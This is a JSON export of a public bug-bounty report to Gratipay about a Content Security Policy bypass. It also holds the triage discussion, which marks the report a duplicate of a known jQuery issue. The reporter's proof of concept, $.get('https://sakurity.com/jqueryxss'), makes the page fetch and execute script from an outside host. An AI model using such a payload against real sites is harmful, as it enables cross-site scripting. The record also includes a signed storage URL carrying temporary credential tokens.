{"id":241192,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDExOTI=","url":"https://hackerone.com/reports/241192","title":"CSP Policy Bypass and javascript execution","state":"Closed","substate":"duplicate","readable_substate":"Duplicate","created_at":"2017-06-18T16:12:36.462Z","submitted_at":"2017-06-18T16:12:36.462Z","is_member_of_team?":false,"reporter":{"disabled":true,"username":"athuljayaram","url":"/athuljayaram","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1868,"url":"https://hackerone.com/gratipay","handle":"gratipay","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Gratipay","twitter_handle":"Gratipay","website":"https://gratipay.com/","about":"Gratitude? Gratipay! The easiest way for your company to pay for open source."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-06-18T17:40:27.286Z","bug_reporter_agreed_on_going_public_at":"2017-06-18T17:40:27.236Z","team_member_agreed_on_going_public_at":"2017-06-18T16:37:00.988Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. CSP provides a standard method for website owners to declare approved origins of content that browsers should be allowed to load on that website — covered types are JavaScript, CSS, HTML frames, web workers, fonts, images, embeddable objects such as Java applets, ActiveX, audio and video files, and other HTML5 features.\n\nContent-Security-Policy-Report-Only: default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;\n\n\nin that their is also a report-uri which sends a report on CSP Violation  as POST in case of CSP violation to \nhttps://gratipay.report-uri.io/r/default/csp/reportOnly;\n\n\nI have a captured CSP post request in case of violation\n\nPUT /r/default/csp/reportOnly HTTP/1.1\nHost: gratipay.report-uri.io\nConnection: close\nContent-Length: 738\nOrigin: https://gratipay.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.24 Safari/537.36\nContent-Type: application/csp-report\nAccept: */*\nDNT: 1\nReferer: https://gratipay.com/about/pricing\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\n\n{\"csp-report\":{\"document-uri\":\"https://gratipay.com/about/pricing\",\"referrer\":\"https://gratipay.com/about/\",\"violated-directive\":\"connect-src\",\"effective-directive\":\"connect-src\",\"original-policy\":\"default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;\",\"disposition\":\"report\",\"blocked-uri\":\"https://sakurity.com/\",\"line-number\":8,\"column-number\":26577,\"source-file\":\"https://assets.gratipay.com/vendors.js?etag=rTtsoO9IGH-cTRpSMarMHQ~~\",\"status-code\":0,\"script-sample\":\"\"}}\n\n\n\n\nI like to use $.get('https://sakurity.com/jqueryxss'); as input to show the CSP policy bypass\n\nby using $.get('https://sakurity.com/jqueryxss'); I was able to bypass allowed CSP policy though https://sakurity.com is not allowed an approved origin of content, still I am able to fetch it and it didn't issue a POST request (report-uri attribute of CSP) which sends a report in case of any CSP violation ,\n\n\nSo using $.get request \nit didn't send a CSP report \nit read the remote content and executed the javascript\n\n\n\n\n\nSOLUTION\nUpdate your javascript libraries mainly jquery  elements to the latest version\n\n","vulnerability_information_html":"\u003cp\u003eContent Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. CSP provides a standard method for website owners to declare approved origins of content that browsers should be allowed to load on that website — covered types are JavaScript, CSS, HTML frames, web workers, fonts, images, embeddable objects such as Java applets, ActiveX, audio and video files, and other HTML5 features.\u003c/p\u003e\n\n\u003cp\u003eContent-Security-Policy-Report-Only: default-src \u0026#39;self\u0026#39;;script-src \u0026#39;self\u0026#39; assets.gratipay.com \u0026#39;unsafe-inline\u0026#39;;style-src \u0026#39;self\u0026#39; assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src \u0026#39;self\u0026#39; assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri \u003ca title=\"https://gratipay.report-uri.io/r/default/csp/reportOnly\" href=\"/redirect?url=https%3A%2F%2Fgratipay.report-uri.io%2Fr%2Fdefault%2Fcsp%2FreportOnly\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gratipay.report-uri.io/r/default/csp/reportOnly\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e;\u003c/p\u003e\n\n\u003cp\u003ein that their is also a report-uri which sends a report on CSP Violation  as POST in case of CSP violation to \u003cbr\u003e\n\u003ca title=\"https://gratipay.report-uri.io/r/default/csp/reportOnly\" href=\"/redirect?url=https%3A%2F%2Fgratipay.report-uri.io%2Fr%2Fdefault%2Fcsp%2FreportOnly\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gratipay.report-uri.io/r/default/csp/reportOnly\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e;\u003c/p\u003e\n\n\u003cp\u003eI have a captured CSP post request in case of violation\u003c/p\u003e\n\n\u003cp\u003ePUT /r/default/csp/reportOnly HTTP/1.1\u003cbr\u003e\nHost: gratipay.report-uri.io\u003cbr\u003e\nConnection: close\u003cbr\u003e\nContent-Length: 738\u003cbr\u003e\nOrigin: \u003ca title=\"https://gratipay.com\" href=\"/redirect?url=https%3A%2F%2Fgratipay.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gratipay.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.24 Safari/537.36\u003cbr\u003e\nContent-Type: application/csp-report\u003cbr\u003e\nAccept: \u003cem\u003e/\u003c/em\u003e\u003cbr\u003e\nDNT: 1\u003cbr\u003e\nReferer: \u003ca title=\"https://gratipay.com/about/pricing\" href=\"/redirect?url=https%3A%2F%2Fgratipay.com%2Fabout%2Fpricing\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gratipay.com/about/pricing\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\u003c/p\u003e\n\n\u003cp\u003e{\u0026quot;csp-report\u0026quot;:{\u0026quot;document-uri\u0026quot;:\u0026quot;\u003ca title=\"https://gratipay.com/about/pricing%22,%22referrer%22:%22https://gratipay.com/about/%22,%22violated-directive%22:%22connect-src%22,%22effective-directive%22:%22connect-src%22,%22original-policy%22:%22default-src\" href=\"/redirect?url=https%3A%2F%2Fgratipay.com%2Fabout%2Fpricing%2522%2C%2522referrer%2522%3A%2522https%3A%2F%2Fgratipay.com%2Fabout%2F%2522%2C%2522violated-directive%2522%3A%2522connect-src%2522%2C%2522effective-directive%2522%3A%2522connect-src%2522%2C%2522original-policy%2522%3A%2522default-src\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gratipay.com/about/pricing%22,%22referrer%22:%22https://gratipay.com/about/%22,%22violated-directive%22:%22connect-src%22,%22effective-directive%22:%22connect-src%22,%22original-policy%22:%22default-src\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u0026#39;self\u0026#39;;script-src \u0026#39;self\u0026#39; assets.gratipay.com \u0026#39;unsafe-inline\u0026#39;;style-src \u0026#39;self\u0026#39; assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src \u0026#39;self\u0026#39; assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri \u003ca title=\"https://gratipay.report-uri.io/r/default/csp/reportOnly;%22,%22disposition%22:%22report%22,%22blocked-uri%22:%22https://sakurity.com/%22,%22line-number%22:8,%22column-number%22:26577,%22source-file%22:%22https://assets.gratipay.com/vendors.js?etag=rTtsoO9IGH-cTRpSMarMHQ~~%22,%22status-code%22:0,%22script-sample%22:%22%22%7D\" href=\"/redirect?url=https%3A%2F%2Fgratipay.report-uri.io%2Fr%2Fdefault%2Fcsp%2FreportOnly%3B%2522%2C%2522disposition%2522%3A%2522report%2522%2C%2522blocked-uri%2522%3A%2522https%3A%2F%2Fsakurity.com%2F%2522%2C%2522line-number%2522%3A8%2C%2522column-number%2522%3A26577%2C%2522source-file%2522%3A%2522https%3A%2F%2Fassets.gratipay.com%2Fvendors.js%3Fetag%3DrTtsoO9IGH-cTRpSMarMHQ~~%2522%2C%2522status-code%2522%3A0%2C%2522script-sample%2522%3A%2522%2522%257D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gratipay.report-uri.io/r/default/csp/reportOnly;%22,%22disposition%22:%22report%22,%22blocked-uri%22:%22https://sakurity.com/%22,%22line-number%22:8,%22column-number%22:26577,%22source-file%22:%22https://assets.gratipay.com/vendors.js?etag=rTtsoO9IGH-cTRpSMarMHQ~~%22,%22status-code%22:0,%22script-sample%22:%22%22%7D\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e}\u003c/p\u003e\n\n\u003cp\u003eI like to use $.get(\u0026#39;\u003ca title=\"https://sakurity.com/jqueryxss\u0026#39;\" href=\"/redirect?url=https%3A%2F%2Fsakurity.com%2Fjqueryxss%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://sakurity.com/jqueryxss\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e); as input to show the CSP policy bypass\u003c/p\u003e\n\n\u003cp\u003eby using $.get(\u0026#39;\u003ca title=\"https://sakurity.com/jqueryxss\u0026#39;\" href=\"/redirect?url=https%3A%2F%2Fsakurity.com%2Fjqueryxss%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://sakurity.com/jqueryxss\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e); I was able to bypass allowed CSP policy though \u003ca title=\"https://sakurity.com\" href=\"/redirect?url=https%3A%2F%2Fsakurity.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://sakurity.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is not allowed an approved origin of content, still I am able to fetch it and it didn\u0026#39;t issue a POST request (report-uri attribute of CSP) which sends a report in case of any CSP violation ,\u003c/p\u003e\n\n\u003cp\u003eSo using $.get request \u003cbr\u003e\nit didn\u0026#39;t send a CSP report \u003cbr\u003e\nit read the remote content and executed the javascript\u003c/p\u003e\n\n\u003cp\u003eSOLUTION\u003cbr\u003e\nUpdate your javascript libraries mainly jquery  elements to the latest version\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[{"id":195246,"file_name":"gratipay_com.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/195/246/268cbeeb24fbc8b4a83acc14aa5b2b3d71f0e80f/gratipay_com.png?response-content-disposition=attachment%3B%20filename%3D%22gratipay_com.png%22%3B%20filename%2A%3DUTF-8%27%27gratipay_com.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050759Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026X-Amz-Signature=9dd7d8c3d9a45b41094bc11e9d59d26c1581a622f1ec3fb84d07ffdf07c7df65","file_size":70246,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":4,"voters":["eveeez","b7de13fb79e2483638f04b8","sumit7","juniorhero"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1764021,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThank you for your report, the receipt of which we herewith confirm. We are currently verifying the issue you reported.\n\nPlease expect additional feedback from us within the next couple of days. The \"INFORMATION SECURITY\" section of the following page has additional, useful information regarding our platform's security: http://inside.gratipay.com/howto/manage-risk\n\nWe appreciate your interest in securing our platform and look forward to working with you.\n\nYours sincerely,\nThe Gratipay Security Team","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThank you for your report, the receipt of which we herewith confirm. We are currently verifying the issue you reported.\u003c/p\u003e\n\n\u003cp\u003ePlease expect additional feedback from us within the next couple of days. The \u0026quot;INFORMATION SECURITY\u0026quot; section of the following page has additional, useful information regarding our platform\u0026#39;s security: \u003ca title=\"http://inside.gratipay.com/howto/manage-risk\" href=\"/redirect?url=http%3A%2F%2Finside.gratipay.com%2Fhowto%2Fmanage-risk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://inside.gratipay.com/howto/manage-risk\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWe appreciate your interest in securing our platform and look forward to working with you.\u003c/p\u003e\n\n\u003cp\u003eYours sincerely,\u003cbr\u003e\nThe Gratipay Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2017-06-18T16:12:36.605Z","updated_at":"2017-06-18T16:12:36.605Z","actor":{"url":"/gratipay","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Gratipay"}},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1764037,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hi @athuljayaram,\n\nThanks for the report. Unfortunately, this has already been reported to us and we are working on a [fix](https://github.com/gratipay/gratipay.com/pull/4377). We look forward to more reports from you in the future.\n\nBest regards,\nEd","markdown_message":"\u003cp\u003eHi \u003ca href=\"/athuljayaram\"\u003e@athuljayaram\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for the report. Unfortunately, this has already been reported to us and we are working on a \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgratipay%2Fgratipay.com%2Fpull%2F4377\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efix\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. We look forward to more reports from you in the future.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nEd\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-18T16:36:54.464Z","updated_at":"2017-06-18T16:36:54.464Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1764038,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-18T16:37:01.007Z","updated_at":"2017-06-18T16:37:01.007Z","first_to_agree":true,"actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1764042,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok, I didn't know that\n\nIt can cause self-xss too\n\nIt would be nice of you if you can thank me on hackerone\n\nI had put a lot of effort in identifying this vulnerability\n","markdown_message":"\u003cp\u003eOk, I didn\u0026#39;t know that\u003c/p\u003e\n\n\u003cp\u003eIt can cause self-xss too\u003c/p\u003e\n\n\u003cp\u003eIt would be nice of you if you can thank me on hackerone\u003c/p\u003e\n\n\u003cp\u003eI had put a lot of effort in identifying this vulnerability\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-18T16:55:31.208Z","updated_at":"2017-06-18T16:55:31.208Z","actor":{"username":"athuljayaram","cleared":false,"url":"/athuljayaram","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1764084,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-18T17:40:27.255Z","updated_at":"2017-06-18T17:40:27.255Z","actor":{"username":"athuljayaram","cleared":false,"url":"/athuljayaram","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1764085,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-18T17:40:27.303Z","updated_at":"2017-06-18T17:40:27.303Z","actor":{"username":"athuljayaram","cleared":false,"url":"/athuljayaram","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1765041,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @athuljayaram,\n\nIn order to really exploit this issue, you need to find one of these two scenarios:\n\n1. Any cross domain requests to untrusted domains which may inadvertently execute script.\n2. Any requests to trusted API endpoints where script can be injected into data sources.\n\nIf you can demonstrate an XSS vulnerability with a thorough PoC we will reward you accordingly.\n\n\u003e It would be nice of you if you can thank me on hackerone\n\nYou are on our \"[Disclosures](http://inside.gratipay.com/appendices/disclosures)\" page. :)\n\nWe look forward to more reports from you in the future.\n\nBest regards,\nEd","markdown_message":"\u003cp\u003eHi \u003ca href=\"/athuljayaram\"\u003e@athuljayaram\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eIn order to really exploit this issue, you need to find one of these two scenarios:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eAny cross domain requests to untrusted domains which may inadvertently execute script.\u003c/li\u003e\n\u003cli\u003eAny requests to trusted API endpoints where script can be injected into data sources.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eIf you can demonstrate an XSS vulnerability with a thorough PoC we will reward you accordingly.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eIt would be nice of you if you can thank me on hackerone\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eYou are on our \u0026quot;\u003ca href=\"/redirect?url=http%3A%2F%2Finside.gratipay.com%2Fappendices%2Fdisclosures\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eDisclosures\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot; page. :)\u003c/p\u003e\n\n\u003cp\u003eWe look forward to more reports from you in the future.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nEd\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-19T12:25:08.873Z","updated_at":"2017-06-19T12:25:08.873Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1766014,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello edio\n\nI have clearly shown it can send cross domain requests to untrusted domains which may inadvertently execute script.\n\nExecute it in console\n\n $.get('https://sakurity.com/jqueryxss'); \n\n\n\n","markdown_message":"\u003cp\u003eHello edio\u003c/p\u003e\n\n\u003cp\u003eI have clearly shown it can send cross domain requests to untrusted domains which may inadvertently execute script.\u003c/p\u003e\n\n\u003cp\u003eExecute it in console\u003c/p\u003e\n\n\u003cp\u003e$.get(\u0026#39;\u003ca title=\"https://sakurity.com/jqueryxss\u0026#39;\" href=\"/redirect?url=https%3A%2F%2Fsakurity.com%2Fjqueryxss%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://sakurity.com/jqueryxss\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e); \u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-19T18:34:10.841Z","updated_at":"2017-06-19T18:34:10.841Z","actor":{"username":"athuljayaram","cleared":false,"url":"/athuljayaram","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1766015,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"$.get('https://sakurity.com/jqueryxss');\n\nIt can execute XSS","markdown_message":"\u003cp\u003e$.get(\u0026#39;\u003ca title=\"https://sakurity.com/jqueryxss\u0026#39;\" href=\"/redirect?url=https%3A%2F%2Fsakurity.com%2Fjqueryxss%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://sakurity.com/jqueryxss\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e);\u003c/p\u003e\n\n\u003cp\u003eIt can execute XSS\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-19T18:34:36.963Z","updated_at":"2017-06-19T18:34:36.963Z","actor":{"username":"athuljayaram","cleared":false,"url":"/athuljayaram","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1766110,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You also categorised this issue as duplicate...kindly tell me this is duplicate to what?\n \nthis is an original issue and even if u include script-src in the content security policy or not\n\nit will still execute\n\n","markdown_message":"\u003cp\u003eYou also categorised this issue as duplicate...kindly tell me this is duplicate to what?\u003c/p\u003e\n\n\u003cp\u003ethis is an original issue and even if u include script-src in the content security policy or not\u003c/p\u003e\n\n\u003cp\u003eit will still execute\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-19T19:00:43.973Z","updated_at":"2017-06-19T19:00:43.973Z","actor":{"username":"athuljayaram","cleared":false,"url":"/athuljayaram","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1770723,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @athuljayaram,\n\nThe duplicate report is located over at #211149 and there is already a [PR](https://github.com/gratipay/gratipay.com/pull/4377) in queue for this issue.\n\nThe beauty of [Egor Homakov](https://twitter.com/homakov)'s discovery is the fact that one can really exploit this issue without pasting anything into the console. All you need to do is find one of the two scenarios I have listed above. \n\nOn a side note, we also discourage users from pasting anything into the console with the following message:\n\n{F196025}\n\nBest regards,\nEd","markdown_message":"\u003cp\u003eHi \u003ca href=\"/athuljayaram\"\u003e@athuljayaram\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe duplicate report is located over at \u003ca href=\"/reports/211149\"\u003e#211149\u003c/a\u003e and there is already a \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgratipay%2Fgratipay.com%2Fpull%2F4377\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePR\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in queue for this issue.\u003c/p\u003e\n\n\u003cp\u003eThe beauty of \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fhomakov\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eEgor Homakov\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026#39;s discovery is the fact that one can really exploit this issue without pasting anything into the console. All you need to do is find one of the two scenarios I have listed above. \u003c/p\u003e\n\n\u003cp\u003eOn a side note, we also discourage users from pasting anything into the console with the following message:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"gratipay_console.PNG\" 